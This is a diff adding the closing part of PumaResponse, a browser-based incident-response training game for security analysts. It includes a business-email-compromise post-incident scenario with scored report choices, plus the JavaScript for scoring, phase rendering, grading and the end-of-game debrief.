+  Attack start:     Feb 15 08:33 (phishing email)
+  Account compromise: Feb 17 02:14 (CEO credentials used)
+  BEC email sent:    Feb 18 11:48 (fraudulent wire request)
+  Wire initiated:   Feb 19 12:15 (CFO approved)
+  Detection:        Feb 19 14:22 (CEO reported)
+  Time to contain:  Varies by your response speed
+
+<span class="log-warn">FINANCIAL IMPACT:</span>
+  Total attempted fraud: $340,000
+  Amount recovered: Depends on triage speed
+  Investigation costs: ~$25,000 (MSSP hours)
+
+<span class="log-warn">ROOT CAUSES:</span>
+  1. No MFA on executive accounts
+  2. DMARC not enforced (p=none)
+  3. No external email warning banner
+  4. No wire transfer verification procedure (verbal confirmation)
+  5. Security awareness training: Last conducted 18 months ago`
+        },
+        choices: [
+          {
+            key: 'A',
+            label: 'Full report with financial impact, root cause analysis, and security roadmap',
+            desc: 'Executive-ready report with attack narrative, financial summary, and 10 prioritized recommendations.',
+            quality: 'good',
+            score: { time: 5, containment: 5, evidence: 10, thoroughness: 25 },
+            outcome: 'Comprehensive report delivered to the board. Recommendations include: mandatory verbal verification for wire transfers >$10K, DMARC enforcement, MFA for all users, quarterly phishing simulations, and email security gateway upgrade. The board approves a $200K security improvement budget. Your MSSP secures a 2-year managed security contract.',
+          },
+          {
+            key: 'B',
+            label: 'Standard incident report with timeline and key recommendations',
+            desc: 'Solid report covering what happened and the top 3 things to fix.',
+            quality: 'partial',
+            score: { time: 10, containment: 0, evidence: 5, thoroughness: 5 },
+            outcome: 'The report covers the incident adequately. Top recommendations (MFA, DMARC, wire verification) are implemented. But without the full root cause analysis, the board doesn\'t understand the systemic issues and allocates minimal budget for improvements.',
+          },
+          {
+            key: 'C',
+            label: 'Send a brief email summary and close the ticket',
+            desc: 'Wrap it up quickly. The client knows what happened.',
+            quality: 'bad',
+            score: { time: 15, containment: -5, evidence: -10, thoroughness: -25 },
+            outcome: 'A two-paragraph email doesn\'t satisfy the board, insurance carrier, or legal counsel. The client feels underserved by your MSSP and begins evaluating competitors. No systematic improvements are made. Similar attacks continue to succeed against the organization.',
+          },
+        ],
+        siemEntries: [
+          { time: '18:00', sev: 'info', text: 'Post-incident: compiling findings and recommendations' },
+          { time: '18:10', sev: 'success', text: 'All containment/eradication actions documented' },
+          { time: '18:15', sev: 'info', text: 'Board briefing requested — report due by EOD tomorrow' },
+        ],
+      },
+    ],
+  },
+];
+
+// ── GAME STATE ─────────────────────────────────────
+const STATE = {
+  incident: null,
+  phaseIdx: 0,
+  scores: { time: 0, containment: 0, evidence: 0, thoroughness: 0 },
+  elapsed: 0,
+  notes: [],
+  choices: [],
+  started: false,
+  awaitingContinue: false,
+};
+
+const PHASE_NAMES = ['TRIAGE', 'CONTAINMENT', 'INVESTIGATION', 'ERADICATION', 'RECOVERY', 'POST-INCIDENT'];
+
+// ── UTILITY ────────────────────────────────────────
+function shuffle(arr) {
+  const a = [...arr];
+  for (let i = a.length - 1; i > 0; i--) {
+    const j = Math.floor(Math.random() * (i + 1));
+    [a[i], a[j]] = [a[j], a[i]];
+  }
+  return a;
+}
+
+function formatElapsed(mins) {
+  const h = Math.floor(mins / 60);
+  const m = mins % 60;
+  return `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}`;
+}
+
+function addSiemEntry(time, sev, text) {
+  const body = $('siem-feed-col');
+  const div = document.createElement('div');
+  div.className = 'siem-entry';
+  const sevClass = { info:'siem-info', warn:'siem-warn', crit:'siem-crit', success:'siem-success' }[sev] || 'siem-info';
+  div.innerHTML = `<span class="siem-time">[${time}]</span> <span class="${sevClass}">${text}</span>`;
+  body.appendChild(div);
+  body.scrollTop = body.scrollHeight;
+}
+
+function addNote(phase, text) {
+  STATE.notes.push({ phase, text });
+  renderNotes();
+}
+
+function renderNotes() {
+  const body = $('notes-col');
+  body.innerHTML = '<div class="section-title" style="margin-top:0;">ANALYST NOTES</div>';
+  STATE.notes.forEach(n => {
+    const div = document.createElement('div');
+    div.className = 'note-entry';
+    div.innerHTML = `<span class="note-phase">[${n.phase}]</span> ${n.text}`;
+    body.appendChild(div);
+  });
+}
+
+// ── RENDER INCIDENT BRIEF ──────────────────────────
+function renderBrief() {
+  const inc = STATE.incident;
+  const brief = $('incident-brief');
+  brief.innerHTML = `
+    <div class="incident-meta">
+      <div class="meta-row"><span class="meta-label">TICKET</span><span class="meta-val">${inc.ticketId}</span></div>
+      <div class="meta-row"><span class="meta-label">CLIENT</span><span class="meta-val">${inc.client}</span></div>
+      <div class="meta-row"><span class="meta-label">SEVERITY</span><span class="meta-val ${inc.sevClass}">${inc.severity}</span></div>
+      <div class="meta-row"><span class="meta-label">ASSIGNED</span><span class="meta-val">${inc.assignedTime}</span></div>
+      <div class="meta-row"><span class="meta-label">TYPE</span><span class="meta-val">${inc.title.split('—')[0].trim()}</span></div>
+    </div>
+    <div class="section-title">SUMMARY</div>
+    <div style="font-size:12px;color:var(--green-dim);line-height:1.6;margin-bottom:8px;">${inc.summary}</div>
+    <div class="section-title">INDICATORS OF COMPROMISE</div>
+    <div class="ioc-list">${inc.iocs.map(i => `<div class="ioc-item"><div class="ioc-type">${i.type}</div><div class="ioc-val">${i.val}</div></div>`).join('')}</div>
+    <div class="score-tracker" id="score-tracker"></div>
+  `;
+  renderScoreTracker();
+}
+
+function renderScoreTracker() {
+  const tracker = $('score-tracker');
+  if (!tracker) return;
+  const s = STATE.scores;
+  const scoreColor = v => v >= 10 ? '' : v >= 0 ? 'warn' : 'crit';
+  tracker.innerHTML = `
+    <div class="section-title">PERFORMANCE METRICS</div>
+    <div class="score-row"><span class="score-label">RESPONSE TIME</span><span class="score-val ${scoreColor(s.time)}">${s.time > 0 ? '+' : ''}${s.time}</span></div>
+    <div class="score-row"><span class="score-label">CONTAINMENT</span><span class="score-val ${scoreColor(s.containment)}">${s.containment > 0 ? '+' : ''}${s.containment}</span></div>
+    <div class="score-row"><span class="score-label">EVIDENCE</span><span class="score-val ${scoreColor(s.evidence)}">${s.evidence > 0 ? '+' : ''}${s.evidence}</span></div>
+    <div class="score-row"><span class="score-label">THOROUGHNESS</span><span class="score-val ${scoreColor(s.thoroughness)}">${s.thoroughness > 0 ? '+' : ''}${s.thoroughness}</span></div>
+  `;
+}
+
+// ── RENDER PHASE ───────────────────────────────────
+function renderPhase() {
+  const phase = STATE.incident.phases[STATE.phaseIdx];
+  const body = $('action-body');
+
+  // Update header
+  $('phase-indicator').textContent = `PHASE: ${phase.name}`;
+  $('phase-progress-fill').style.width = `${((STATE.phaseIdx) / PHASE_NAMES.length) * 100}%`;
+  $('hdr-elapsed').textContent = formatElapsed(STATE.elapsed);
+
+  body.innerHTML = `
+    <div class="narrative-box">
+      <div class="narrator">SITUATION BRIEFING — ${phase.name}</div>
+      ${phase.narrative}
+    </div>
+    <div class="evidence-box">
+      <div class="ev-title">${phase.evidence.title}</div>
+      <pre>${phase.evidence.content}</pre>
+    </div>
+    <div class="section-title" style="margin-top:12px;">SELECT YOUR RESPONSE</div>
+    <div class="choices-container" id="choices-container">
+      ${shuffle(phase.choices.map((c, i) => ({ ...c, origIdx: i })))
+        .map((c, displayIdx) => {
+          const keys = ['A','B','C'];
+          return `<button class="choice-btn" data-idx="${c.origIdx}" onclick="selectChoice(${c.origIdx})">
+          <span class="choice-key">[${keys[displayIdx]}]</span>
+          <span class="choice-label">${c.label}</span>
+          <span class="choice-desc">${c.desc}</span>
+        </button>`;
+        }).join('')}
+    </div>
+    <div id="outcome-area"></div>
+  `;
+
+  // Add SIEM entries for this phase
+  phase.siemEntries.forEach((e, i) => {
+    setTimeout(() => addSiemEntry(e.time, e.sev, e.text), i * 400);
+  });
+
+  renderScoreTracker();
+  STATE.awaitingContinue = false;
+}
+
+// ── CHOICE HANDLING ────────────────────────────────
+function selectChoice(idx) {
+  if (STATE.awaitingContinue) return;
+  STATE.awaitingContinue = true;
+
+  const phase = STATE.incident.phases[STATE.phaseIdx];
+  const choice = phase.choices[idx];
+
+  // Apply scores
+  Object.keys(choice.score).forEach(k => {
+    STATE.scores[k] += choice.score[k];
+  });
+
+  // Track elapsed time (base 30 min per phase, modified by time score)
+  STATE.elapsed += Math.max(10, 30 - choice.score.time);
+
+  STATE.choices.push({ phase: phase.name, choice: choice.key, quality: choice.quality });
+
+  // Add note
+  addNote(phase.name, `Action: ${choice.label} [${choice.quality.toUpperCase()}]`);
+
+  // Replace choices with outcome
+  const qualityClass = { good: 'good', partial: '', bad: 'bad' }[choice.quality];
+  const titleClass = { good: 'good', partial: 'neutral', bad: 'bad' }[choice.quality];
+  const titleText = { good: 'EFFECTIVE RESPONSE', partial: 'ACCEPTABLE — ROOM FOR IMPROVEMENT', bad: 'SUBOPTIMAL RESPONSE' }[choice.quality];
+
+  const scoreLines = Object.entries(choice.score).map(([k, v]) => {
+    if (v === 0) return '';
+    return `<span class="${v > 0 ? 'pos' : 'neg'}">${k.toUpperCase()}: ${v > 0 ? '+' : ''}${v}</span>`;
+  }).filter(Boolean).join('  ');
+
+  // Remove choices section title, choices, and outcome-area — replace with outcome
+  const choicesContainer = $('choices-container');
+  const choicesTitle = choicesContainer.previousElementSibling; // "SELECT YOUR RESPONSE"
+  const outcomeArea = $('outcome-area');
+  if (choicesTitle && choicesTitle.classList.contains('section-title')) choicesTitle.remove();
+  choicesContainer.remove();
+  outcomeArea.innerHTML = `
+    <div class="section-title" style="margin-top:12px;">YOUR ACTION: [${choice.key}] ${choice.label}</div>
+    <div class="outcome-box ${qualityClass}">
+      <div class="outcome-title ${titleClass}">${titleText}</div>
+      <div class="outcome-text">${choice.outcome}</div>
+      <div class="outcome-score">${scoreLines}</div>
+    </div>
+    <button class="continue-btn" onclick="advancePhase()" id="continue-btn">
+      ${STATE.phaseIdx < PHASE_NAMES.length - 1 ? 'PROCEED TO NEXT PHASE ▸' : 'COMPLETE INCIDENT ▸'}
+    </button>
+  `;
+
+  // Add outcome SIEM entry
+  const sevMap = { good: 'success', partial: 'warn', bad: 'crit' };
+  addSiemEntry(formatElapsed(STATE.elapsed).replace(/^0/, ''), sevMap[choice.quality],
+    `${phase.name}: ${titleText}`);
+
+  renderScoreTracker();
+
+  // Scroll to outcome
+  outcomeArea.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+}
+
+// ── PHASE ADVANCEMENT ──────────────────────────────
+function advancePhase() {
+  STATE.phaseIdx++;
+  if (STATE.phaseIdx >= PHASE_NAMES.length) {
+    endGame();
+  } else {
+    renderPhase();
+  }
+}
+
+// ── END GAME ───────────────────────────────────────
+function endGame() {
+  $('game-screen').classList.remove('visible');
+
+  const s = STATE.scores;
+  const total = s.time + s.containment + s.evidence + s.thoroughness;
+  const maxPossible = 6 * (25 + 25 + 25 + 25); // rough max if all "good"
+  const pct = Math.round((total / 300) * 100); // normalized to 300 as practical max
+
+  let grade, gradeClass, titleText, titleClass, subtitle;
+  if (pct >= 80) {
+    grade = 'A'; gradeClass = 'green'; titleText = 'INCIDENT RESOLVED'; titleClass = 'success';
+    subtitle = 'Outstanding response. Your methodical approach minimized damage, preserved evidence, and set the client up for long-term improvement. The MSSP is proud to have you on the team.';
+  } else if (pct >= 60) {
+    grade = 'B'; gradeClass = 'green'; titleText = 'INCIDENT RESOLVED'; titleClass = 'success';
+    subtitle = 'Solid response overall. You contained the threat and recovered operations, though some opportunities for improvement were missed. Good work, analyst.';
+  } else if (pct >= 40) {
+    grade = 'C'; gradeClass = 'amber'; titleText = 'INCIDENT CONTAINED'; titleClass = 'partial';
+    subtitle = 'The incident was eventually contained, but delays and missed steps increased the blast radius. Review your approach and consider what could be done differently next time.';
+  } else if (pct >= 20) {
+    grade = 'D'; gradeClass = 'amber'; titleText = 'INCIDENT CONTAINED — BARELY'; titleClass = 'partial';
+    subtitle = 'Significant gaps in your response led to unnecessary damage, lost evidence, and client dissatisfaction. A post-mortem on your own process is recommended.';
+  } else {
+    grade = 'F'; gradeClass = 'red'; titleText = 'RESPONSE FAILURE'; titleClass = 'failure';
+    subtitle = 'Critical errors throughout the response resulted in maximum damage, destroyed evidence, and a very unhappy client. Your MSSP manager would like a word.';
+  }
+
+  $('end-title').textContent = titleText;
+  $('end-title').className = `end-title ${titleClass}`;
+  $('end-subtitle').textContent = subtitle;
+
+  const goodCount = STATE.choices.filter(c => c.quality === 'good').length;
+  const partialCount = STATE.choices.filter(c => c.quality === 'partial').length;
+  const badCount = STATE.choices.filter(c => c.quality === 'bad').length;
+
+  const scoreColor = v => v >= 20 ? 'sc-val' : v >= 0 ? 'sc-val warn' : 'sc-val crit';
+
+  $('end-scorecard').innerHTML = `
+    <div class="scorecard-title">PERFORMANCE SCORECARD</div>
+    <div class="sc-row"><span>Incident</span><span class="sc-val">${STATE.incident.title}</span></div>
+    <div class="sc-row"><span>Client</span><span class="sc-val">${STATE.incident.client}</span></div>
+    <div class="sc-row"><span>Total Elapsed</span><span class="sc-val">${formatElapsed(STATE.elapsed)}</span></div>
+    <div class="sc-section">SCORING BREAKDOWN</div>
+    <div class="sc-row"><span>Response Time</span><span class="${scoreColor(s.time)}">${s.time > 0 ? '+' : ''}${s.time}</span></div>
+    <div class="sc-row"><span>Containment</span><span class="${scoreColor(s.containment)}">${s.containment > 0 ? '+' : ''}${s.containment}</span></div>
+    <div class="sc-row"><span>Evidence Preservation</span><span class="${scoreColor(s.evidence)}">${s.evidence > 0 ? '+' : ''}${s.evidence}</span></div>
+    <div class="sc-row"><span>Thoroughness</span><span class="${scoreColor(s.thoroughness)}">${s.thoroughness > 0 ? '+' : ''}${s.thoroughness}</span></div>
+    <div class="sc-section">DECISION QUALITY</div>
+    <div class="sc-row"><span>Optimal Decisions</span><span class="sc-val" style="color:var(--green)">${goodCount}/6</span></div>
+    <div class="sc-row"><span>Acceptable Decisions</span><span class="sc-val" style="color:var(--amber)">${partialCount}/6</span></div>
+    <div class="sc-row"><span>Poor Decisions</span><span class="sc-val" style="color:var(--red)">${badCount}/6</span></div>
+    <div class="sc-total">
+      <div class="sc-grade ${gradeClass}">${grade}</div>
+      <div>
+        <div class="sc-grade-label">OVERALL GRADE</div>
+        <div style="font-size:12px;color:var(--green-dim);">${total} points</div>
+      </div>
+    </div>
+  `;
+
+  // Debrief
+  const debrief = $('end-debrief');
+  const phases = STATE.choices.map((c, i) => {
+    const icon = { good: '✓', partial: '~', bad: '✗' }[c.quality];
+    const color = { good: 'var(--green)', partial: 'var(--amber)', bad: 'var(--red)' }[c.quality];
+    return `<span style="color:${color}">${icon} ${c.phase}</span>`;
+  }).join(' → ');
+  debrief.innerHTML = `<div style="margin-bottom:8px;font-size:11px;letter-spacing:1px;color:var(--green-dark);">PHASE DECISIONS</div>${phases}`;
+
+  $('end-screen').classList.add('visible');
+}
+
+// ── KEYBOARD CONTROLS ──────────────────────────────
+document.addEventListener('keydown', (e) => {
+  if (!STATE.started) return;
+
+  const key = e.key.toUpperCase();
+  // A/B/C and 1/2/3 select by display position (nth button on screen)
+  if (['A', 'B', 'C'].includes(key) && !STATE.awaitingContinue) {
+    const displayIdx = key.charCodeAt(0) - 65;
+    const btns = document.querySelectorAll('.choice-btn');
+    if (displayIdx < btns.length) {
+      selectChoice(parseInt(btns[displayIdx].dataset.idx));
+    }
+  }
+  if ((key === 'ENTER' || key === ' ') && STATE.awaitingContinue) {
+    const btn = $('continue-btn');
+    if (btn) {
+      e.preventDefault();
+      advancePhase();
+    }
+  }
+  if (key >= '1' && key <= '3' && !STATE.awaitingContinue) {
+    const displayIdx = parseInt(key) - 1;
+    const btns = document.querySelectorAll('.choice-btn');
+    if (displayIdx < btns.length) {
+      selectChoice(parseInt(btns[displayIdx].dataset.idx));
+    }
+  }
+});
+
+// ── START GAME ─────────────────────────────────────
+function startGame() {
+  // Pick random incident
+  STATE.incident = INCIDENTS[Math.floor(Math.random() * INCIDENTS.length)];
+  STATE.phaseIdx = 0;
+  STATE.scores = { time: 0, containment: 0, evidence: 0, thoroughness: 0 };
+  STATE.elapsed = 0;
+  STATE.notes = [];
+  STATE.choices = [];
+  STATE.started = true;
+
+  // Update header
+  $('hdr-ticket').textContent = STATE.incident.ticketId;
+  const sevSpan = $('hdr-severity');
+  sevSpan.textContent = STATE.incident.severity;
+  sevSpan.className = STATE.incident.sevClass === 'high' ? 'crit' : '';
+
+  // Show game screen
+  $('game-screen').classList.add('visible');
+
+  // Render
+  renderBrief();
+  renderPhase();
+
+  // Initial SIEM entries
+  addSiemEntry('--:--', 'info', 'PumaResponse MSSP Platform initialized');
+  addSiemEntry('--:--', 'info', `Analyst on shift — incident queue: 1`);
+}
+
+// ── SIEM PANEL EXPAND/COLLAPSE ─────────────────────
+$('right-panel').addEventListener('click', (e) => {
+  e.stopPropagation();
+  $('main').classList.toggle('siem-expanded');
+});
+
+$('siem-overlay').addEventListener('click', (e) => {
+  e.stopPropagation();
+  $('main').classList.remove('siem-expanded');
+});
+
+// ── ABOUT MODAL ───────────────────────────────────
+$('about-btn').addEventListener('click', (e) => {
+  e.stopPropagation();
+  $('about-modal').classList.add('visible');
+});
+$('about-close-btn').addEventListener('click', () => {
+  $('about-modal').classList.remove('visible');
+});
+$('about-modal').addEventListener('click', (e) => {
+  if (e.target === $('about-modal')) $('about-modal').classList.remove('visible');
+});
+
+// Console easter egg
+console.log('%c╔══════════════════════════════════════════╗', 'color: #00ff41');
+console.log('%c║  PUMARESPONSE — INCIDENT RESPONSE SIM   ║', 'color: #00ff41');
+console.log('%c║  if you\'re reading this, good instincts. ║', 'color: #00ff41');
+console.log('%c║  check the SIEM logs. always check logs. ║', 'color: #00ff41');
+console.log('%c╚══════════════════════════════════════════╝', 'color: #00ff41');
+</script>
+</body>
+</html>
